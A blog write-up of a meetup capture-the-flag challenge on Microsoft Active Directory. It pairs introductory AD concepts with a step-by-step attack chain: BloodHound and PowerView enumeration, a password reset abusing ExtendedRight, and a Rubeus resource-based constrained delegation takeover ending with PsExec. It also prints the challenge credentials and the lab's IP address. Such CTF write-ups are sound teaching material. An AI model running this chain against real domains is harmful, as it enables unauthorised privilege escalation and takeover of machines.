---
layout: post
title:  "A (not so) Gentle Intro to Active Directory: ØxＯＰＯＳɆＣ [0xF09F8EA3] Challenge"
categories: [infosec, writeup]
tags: [activedirectory, oposec, infosec, writeup]
thumbnail: /images/adchall21/adgeneric.png
description: "Field notes for Microsoft AD and write-up for the challenge of ØxＯＰＯＳɆＣ Mɇɇtuᵽ [0xF09F8EA3]"
---

Yet another month, yet another ØxＯＰＯＳɆＣ meetup. This is a write-up on the 0xF09F8EA3 edition Microsoft Active Directory challenge. Since it is my first challenge dealing with AD and domain controllers, some field notes and introductory notes are also presented.

<!--more-->

The meetup happens in a monthly-basis, feel free to [join in](https://www.meetup.com/0xOPOSEC/). Challenge by [@ArmySick](/404).

This challenge was solved with the helpful support of [@darkcookie](https://twitter.com/Pedro_SEC_R).

## Challenge

"A company named 0xOPOSEC is said to be in possession of what may be some unreleased lyrics of an Elvis Presley song. A disgruntled employee leaked a short portion of the song where we can hear the King of Rock and Roll singing '*You ain't nothing but (...)*'. Help us figure out what the fuss is all about.
We managed to get a hold of one account left behind by the disgruntled employee:

```
oposec.local\user1
l%^nMv0+A4XYKVgkUseA
```

We believe this `oposec.local` domain is accessible at `5x.1xx.2xx.4x` (full IP address hidden for the purposes of this write-up).

Good luck."

## NMAP and friends

Since this was a public accessible machine, my first step was to go to [Shodan](https://www.shodan.io/). The host was up and alive, with a lot of known ports open to the world (which immediately pointed to a Windows machine due to the exposed services).  

Running NMAP on the machine allowed us to find out that we are indeed dealing with Windows machine with Active Directory Domain Service (AD DS):

```
PORT     STATE SERVICE       VERSION
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-15 01:37:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oposec.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: oposec.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

**Note**: Some time was lost trying to solve this challenge in a Linux machine. For a more streamlined experience, I ended up spinning a [Windows 10 VM](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/) (and turning off Windows Defender and friends). Also, we will be using PowerShell, so remember to allow script execution: `> Set-ExecutionPolicy Bypass`.

## AD Concepts 101

From [Wikipedia](https://en.wikipedia.org/wiki/Active_Directory): "Active Directory (AD) is a directory service developed by Microsoft for Windows domain networks. (...) Active Directory became an umbrella title for a broad range of *directory-based identity-related services*. 

A server running the Active Directory Domain Service (AD DS) role is called a domain controller. It authenticates and authorizes all users and computers in a Windows domain type network, assigning and enforcing security policies for all computers (...). Active Directory uses **Lightweight Directory Access Protocol (LDAP)** versions 2 and 3, Microsoft's version of Kerberos, and DNS."

<img src="/images/adchall21/dcview.jpg" alt="From http://www.openeducation.org/moodle/course/view.php?id=60 (Guest Login)">

### Objects in AD

"Active Directory structures are arrangements of information about **objects**. The objects fall into two broad categories: **resources** (e.g., printers) and **security principals** (user or computer accounts and groups). **Security principals are assigned unique security identifiers (SIDs).**"

### Forests, Trees and Domains

"The forest, tree, and domain are the logical divisions in an Active Directory network.

Within a deployment, *objects are grouped into domains*. The objects for a single domain are stored in a single database. *Domains are identified by their **DNS name structure***, the namespace.

A domain is defined as a logical group of network objects (computers, users, devices) that share the same Active Directory database.

A tree is a collection of one or more domains and domain trees in a contiguous namespace, and is linked in a transitive trust hierarchy.

At the top of the structure is the **forest**. A forest is a collection of trees that share a common global catalog, directory schema, logical structure, and directory configuration. The forest represents the security boundary within which users, computers, groups, and other objects are accessible."


## Recon Stage #1

So first things first, we have a username and a password which should be valid AD credentials. To assert if they are indeed valid we can simply use an SMB Client to check if we can establish a connection. For simplicity’s sake, we are going to use some tools part of [Impacket](https://github.com/SecureAuthCorp/impacket), including their [smbclient.py](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_23/examples/smbclient.py).

```bash
$ smbclient.py 'user1':l%^nMv0+A4XYKVgkUseA@5x.1xx.2xx.4x'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
Type help for list of commands

# shares
ADMIN$
C$
D$
F$
IPC$
NETLOGON
SYSVOL
``` 

### Bloodhound

To find out what we can do with our account, the first suggestion (which was also an hint) is [Bloodhound](https://github.com/BloodHoundAD/BloodHound). From their README, "BloodHound uses **graph theory to reveal the hidden and often unintended relationships within an Active Directory environment**. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify."

Bloodhound works by (1) collecting data using one of the available [collectors](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors), (2) importing the resulting data to [neo4j](https://neo4j.com/), and then (3) use its GUI to navigate in the connection graph and making more advanced queries.

In our case we used the [SharpHound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html) to do the initial recon on the DC.

```powershell
PS C:\> Import-module sharphound.ps1
PS C:\> Invoke-BloodHound --CollectionMethod All --DomainController 5x.1xx.2xx.4x --OutputDirectory C:\temp\
```

This creates a new data dump in `temp` which we can then import to Bloodhound, resulting in something similar to the following image:

<img src="/images/adchall21/userone.png">

If you are stuck in a Linux machine, you can use a [Python port of the SharpHoud](https://github.com/fox-it/BloodHound.py) and follow a similar process:

`$ bloodhound-python -u User1 -p l%^nMv0+A4XYKVgkUseAWe -ns 51.137.206.45 -d oposec.local -c All`

We can see by the image that `user1` has `AllExtendedRights` over `writeradmin`. To collect more information about what other users can do over `writeradmin` object, we proceed to enumerated all the **Access Control Policies** (ACL) that apply to `writeradmin` using `Recon/PowerView` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit).

### PowerSploit

Using most of the tools of PowerSploit requires a `PSCredential` object to be pass as an access `Credential`.

```powershell
> [string]$userName = "user1"
> [string]$userPassword = "l%^nMv0+A4XYKVgkUseA"
> [securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
> [pscredential]$user1credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
```

**Note**: In AD, if we want to find out what a preceding object can do upon another object, we need to enumerate the ACLs of the second.

`> Get-DomainObjectAcl -Identity writeradmin -domain oposec.local -Server 5x.1xx.2xx.4x -Credential $user1credObject | Out-GridView`

**Note**: Piping to `Out-GridView` gives us a searchable CSV interface, which simplifies some tasks.

### ADExplorer

Part of the [Windows Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) tools, ADExplorer is an Active Directory (AD) viewer and editor, allowing to "navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute". 

<img src="/images/adchall21/adexplorerview.png">

ADExplorer presents a tree-view of the target DC, allowing us to navigate among objects, including `Users` and `Computers`. This allowed us to find some extra clues about the challenge, including:

- There are two computers: `App1` and `App2` (this was crucial, since `App2` does not appear in the Bloodhound scan);
- More than the common default users, there are three users of interest: `User1` (the given account), `writeradmin` and `app1admin`;
- The description of `writeradmin` object gives an hint: `This user has some write permissions... Also, they can read computer accounts' descriptions for flags ;)`.

ADExplorer eases the process of searching for objects and check what is their accessible information, including `description`, `SAMAccountName`, `ObjectSid`, etc. This eases our task of understanding the output of `Get-DomainObjectAcl`, since we can now quickly search by the `user1` `SID` to see what are the ACLs applied over this object for `writeradmin` object.

Summarizing, here is a collection of all important Objects and their SIDs. While at this point we still do not known `App2$` SID, it is already presented for simplicity sake.

| Object            | SID                                           | IP             |
|-------------------|-----------------------------------------------|----------------|
| oposec.local [DC] | S-1-5-21-3888316195-1058498269-834682652      | 5x.1xx.206.45  |
| User1             | S-1-5-21-3888316195-1058498269-834682652-1103 |                |
| writeradmin       | S-1-5-21-3888316195-1058498269-834682652-2102 |                |
| app1admin         | S-1-5-21-3888316195-1058498269-834682652-2104 |                |
| App1$             | S-1-5-21-3888316195-1058498269-834682652-1104 | 5x.1xx.205.253 |
| App2$             | S-1-5-21-3888316195-1058498269-834682652-1105 |                |



## Pwning `writeradmin`

By the intel gathered with ADExplorer we are now convinced that need to pwn the `writeradmin` user, since they can read `flags`!

<img src="/images/adchall21/extendedright.png">

By inspecting the **ACLs** of `writeradmin` we observe that the object `User1` (by searching for its SID) has `ExtendedRight` over it. A quick search shows that users with `ExtendedRight` in [some situations](https://stealthbits.com/blog/attacking-active-directory-permissions-with-bloodhound/) can enable a object to reset passwords of other objects.

Testing this theory out, we can user PowerView again, with `Set-DomainUserPassword` feature.

```powershell
PS C:\> $writeradminNewPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\> Set-DomainUserPassword -Domain 5x.1xx.206.45 -Identity writeradmin -AccountPassword $writeradminNewPass -Credential $user1credObject
```
As this command has no output on success, it is time to test out if it really worked. Trying to use ADExplorer with this account gives us a new view:

<img src="/images/adchall21/flag1.png">

And we got ourself the first flag! And a Computer Account password for `App2$`.

> flag{never_caught_a_rabbit}  Computer Account password: MdXShCaeOviiTzxk3g0G

We can once again check if it is a valid credential or not:

```powershell
PS C:\> smbclient.py 'App2$':MdXShCaeOviiTzxk3g0G@51.137.206.45
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
D$
F$
IPC$
NETLOGON
SYSVOL
# use ADMIN$
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

The user/pass works... but we are not admins, *yet*!

## Recon Stage #2

We now have two new accounts to explore. First thing, we can now complete the table with the missing SID for `App2$`. Next, running `SharpHound` again in the two new accounts gives us some insights on the next steps.

First for `writeradmin`:

<img src="/images/adchall21/writeradmin.png">

Then for `App2$`:

<img src="/images/adchall21/app2.png">

While `writeradmin` does not give any new information beyond what we already knew, Bloodhound showed that a certain SID (1105) -- corresponding to `App2$` -- is `AllowedToAct` on `App1$`.

We can manually confirm this by checking that `App1$` has the following configuration present:

| `msDS-AllowedToActOnBehalfOfOtherIdentity` | `D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3888316195-1058498269-834682652-1105)` |

## `App1$` takeover

By searching for attacks that leverage this `AllowedToActOnBehalfOfOtherIdentity` functionality, we quickly find [*Kerberos Resource-based Constrained Delegation: Computer Object Take Over*](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution). While this is a several steps attack, we already have an account which has the `AllowedToAct` rights, thus we can focus on a subset of the steps of the attack:

1. `msDS-AllowedToActOnBehalfOfOtherIdentity` enables `App2$` to impersonate and authenticate any domain user that can then access the target system `App1$`. In simple terms this means that the target computer `App1$` is happy for the computer resource `App2$` to impersonate any domain user if they want to access anything on `App1$`;
2. `App1$` trusts `App2$` (due to the `msDS-AllowedToActOnBehalfOfOtherIdentity`);
3. We request kerberos tickets for `App2$` with ability to impersonate `oposec.local\app1admin` who is admin of `App1$`;
4. Takeover complete.

In order to carry such attack we need something that can craft Kerberos tickets for our purposes. By following the tutorial of *ired.team*, we can use [Rubeus](https://github.com/GhostPack/Rubeus) for that. You can find pre-compiled binaries [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).

Additionally, to avoid any issue, both `oposec.local` and `app1.oposec.local` should be added to the `hosts` file.

The first thing we need to do is to generate a RC4 hash of the password we have for `App2$`:

```powershell
PS C:\ .\Rubeus.exe hash /password:MdXShCaeOviiTzxk3g0G /user:App2 /domain:oposec.local

Rubeus  v1.6.4

[*] Action: Calculate Password Hash(es)

[*] Input password             : MdXShCaeOviiTzxk3g0G
[*] Input username             : App2
[*] Input domain               : oposec.local
[*] Salt                       : OPOSEC.LOCALapp2
[*]       rc4_hmac             : EED530845242DD4013C0BEF37787EA33
[*]       aes128_cts_hmac_sha1 : 7520D771E68ECBDD07DF87D50B335F9C
[*]       aes256_cts_hmac_sha1 : 6498A898DB822E6C554FF12D069A7718975C11C169809DD7B516B6A67A76FE59
[*]       des_cbc_md5          : 15FD1054A20DF2A4
```

And then crafting a ticket:

```powershell
PS C:\> .\Rubeus.exe s4u /user:App2$ /rc4:EED530845242DD4013C0BEF37787EA33 /impersonateuser:app1admin /msdsspn:cifs/app1.oposec.local /ptt /output:ticket.txt /domain:oposec.local /dc:51.137.206.45

 Rubeus v1.6.4

[*] Action: S4U

[*] Using rc4_hmac hash: EED530845242DD4013C0BEF37787EA33
[*] Building AS-REQ (w/ preauth) for: 'oposec.local\App2$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE3DCCBNigAwIBBaEDAgEWooID9DCCA/BhggPsMIID6KADAgEFoQ4bDE9QT1NFQy5MT0NBTKIhMB+g...


[*] Action: S4U

[*] Using domain controller: 51.137.206.45
[*] Building S4U2self request for: 'App2$@OPOSEC.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'app1admin' to 'App2$@OPOSEC.LOCAL'
[*] base64(ticket.kirbi):

      doIFGjCCBRagAwIBBaEDAgEWooIEPTCCBDlhggQ1MIIEMaADAgEFoQ4bDE9QT1NFQy5MT0NBTKISMBCg...

[*] Impersonating user 'app1admin' to target SPN 'cifs/app1.oposec.local'
[*] Using domain controller: 51.137.206.45
[*] Building S4U2proxy request for service: 'cifs/app1.oposec.local'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/app1.oposec.local':

      doIF4jCCBd6gAwIBBaEDAgEWooIE8zCCBO9hggTrMIIE56ADAgEFoQ4bDE9QT1NFQy5MT0NBTKIkMCKg...

[+] Ticket successfully imported!
```

As it can be seen at the end Rubeus automatically adds the generated ticket to our localhost. This can be checked using `klist`:

```powershell
PS C:\> klist
Current LogonId is 0:0x1f6bb
Cached Tickets: (1)

#0>     Client: app1admin @ OPOSEC.LOCAL
        Server: cifs/app1.oposec.local @ OPOSEC.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 6/26/2021 16:55:48 (local)
        End Time:   6/27/2021 2:55:48 (local)
        Renew Time: 7/3/2021 16:55:48 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

We can now use this ticket to access the target machine, `app1.oposec.local`:

```powershell
PS C:\> ls \\app1.oposec.local\c$

    Directory: \\app1.oposec.local\c$

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/22/2021   9:21 PM                Files
d-----          3/8/2021   3:00 PM                inetpub
d-----          3/8/2021   2:56 PM                Packages
d-----          2/3/2021   4:36 AM                PerfLogs
d-r---         6/26/2021  12:11 AM                Program Files
d-----         7/16/2016   2:23 PM                Program Files (x86)
d-r---          6/9/2021   2:22 PM                Users
d-r---         6/20/2021  11:48 AM                Windows
d-----         5/13/2021   5:17 AM                WindowsAzure
-a----         6/10/2021   6:10 PM            156 flag.txt

PS C:\> cat '\\app1.oposec.local\c$\flag.txt'
flag{you_was_high_classed} Congratulations! Ping (@)armysick with both flags!
```

And we got ourselves the final flag:

> flag{you_was_high_classed} Congratulations! 

We could also use `PSExec` from Sysinternals to have remote control over the machine:

```powershell
PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\app1.oposec.local cmd

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows>hostname
APP1

```

## Wrap-Up

This was one of the most demanding challenges I ever put myself into, mostly due to (1) being Windows which is a platform with little to no focus on CTFs and other challenges, (2) the dependency on the Windows ecosystem and its tools -- making it hard to impossible to complete using Linux, and (3) the large number of tools and scripts required.

The resolution of this challenges would not be possible without the help of [@darkcookie](https://twitter.com/Pedro_SEC_R), kudos! Also, a thank you note to [@Moreira] for providing me some of the screenshots used in this writeup.

Lastly, thanks [@ArmySick] for setting up the challenge!